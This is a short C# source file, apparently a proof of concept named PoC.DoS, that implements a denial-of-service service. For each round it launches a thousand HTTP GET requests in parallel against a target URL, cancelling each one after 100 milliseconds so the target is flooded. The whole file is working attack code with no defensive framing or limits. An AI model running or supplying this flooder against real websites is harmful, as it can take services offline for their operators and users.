namespace PoC.DoS.Services
{
    public interface IDoSService
    {
        Task RunAsync(HttpClient httpClient, string url, int round);
    }

    public class DoSService : IDoSService
    {
        public async Task RunAsync(HttpClient httpClient, string url, int round)
        {
            int[] items = Enumerable.Range(1, round).ToArray();
            int[] numberOfRequestEachRound = Enumerable.Range(1, 1000).ToArray();
            var options = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount };
            try
            {
                await Parallel.ForEachAsync(items, options, async (item, state) =>
                {
                    var tasks = numberOfRequestEachRound.Select(x => RunAsync());

                    await Task.WhenAll(tasks);

                });
            }
            catch (InvalidOperationException ex)
            {
                Console.WriteLine(ex.Message);
            }

            async Task RunAsync()
            {
                var c = new CancellationTokenSource();
                httpClient.GetAsync(url, c.Token);
                await Task.Delay(100);
                c.Cancel();
            }
        }
    }
}